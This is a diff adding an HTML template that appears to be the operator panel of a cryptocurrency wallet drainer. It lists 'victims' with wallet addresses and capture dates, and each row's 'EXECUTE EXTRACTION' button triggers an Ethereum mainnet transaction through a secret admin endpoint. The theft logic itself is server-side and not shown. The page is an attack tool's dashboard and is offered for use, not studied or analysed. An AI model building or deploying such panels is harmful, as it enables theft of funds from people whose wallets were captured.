@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM ADMIN | ASSET RECOVERY</title>
+    <style>
+        body {
+            margin: 0;
+            background: #020617;
+            color: #f1f5f9;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 30px;
+        }
+        .header {
+            border-bottom: 2px solid #ef4444;
+            padding-bottom: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        h1 { color: #ef4444; margin: 0; font-size: 24px; }
+        .stats { font-size: 14px; color: #94a3b8; }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: #0f172a;
+        }
+        th {
+            background: #1e293b;
+            color: #38bdf8;
+            text-align: left;
+            padding: 15px;
+            font-size: 13px;
+        }
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #1e293b;
+            font-size: 13px;
+        }
+        .address { color: #94a3b8; font-family: monospace; }
+        .btn-extract {
+            background: #ef4444;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 4px;
+            transition: 0.2s;
+        }
+        .btn-extract:hover { background: #b91c1c; box-shadow: 0 0 10px rgba(239, 68, 68, 0.5); }
+        .btn-extract:disabled { background: #444; cursor: not-allowed; }
+
+        .badge {
+            background: #064e3b;
+            color: #4ade80;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🔴 CORE ASSET CONTROL PANEL</h1>
+    <div class="stats">System Status: ONLINE | Active Signatures: {{ victims|length }}</div>
+</div>
+
+<table>
+    <thead>
+        <tr>
+            <th>USER ID</th>
+            <th>WALLET ADDRESS</th>
+            <th>CAPTURE DATE</th>
+            <th>EXPIRATION</th>
+            <th>STATUS</th>
+            <th>COMMAND</th>
+        </tr>
+    </thead>
+    <tbody>
+        {% for v in victims %}
+        <tr>
+            <td>{{ v.user.username }}</td>
+            <td class="address">{{ v.wallet_address }}</td>
+            <td>{{ v.user.date_joined|date:"Y-m-d H:i" }}</td>
+            <td>10 YEARS</td>
+            <td><span class="badge">READY</span></td>
+            <td>
+                <button class="btn-extract" onclick="doExtract(this, '{{ v.id }}')">EXECUTE EXTRACTION</button>
+            </td>
+        </tr>
+        {% empty %}
+        <tr>
+            <td colspan="6" style="text-align: center; color: #475569; padding: 50px;">NO DATA CAPTURED</td>
+        </tr>
+        {% endfor %}
+    </tbody>
+</table>
+
+<script>
+async function doExtract(btn, id) {
+    if (!confirm("CONFIRM: Execute transaction on Ethereum Mainnet? Gas will be used.")) return;
+
+    btn.disabled = true;
+    btn.innerText = "EXECUTING...";
+
+    try {
+        const response = await fetch(`/secret-admin/extract/${id}/`);
+        const data = await response.json();
+
+        if (data.status === 'success') {
+            alert("COMMAND EXECUTED\nTX HASH: " + data.tx);
+            location.reload();
+        } else {
+            alert("ERROR: " + data.msg);
+            btn.disabled = false;
+            btn.innerText = "EXECUTE EXTRACTION";
+        }
+    } catch (e) {
+        alert("CRITICAL SYSTEM ERROR");
+        btn.disabled = false;
+    }
+}
+</script>
+
+</body>
+</html>
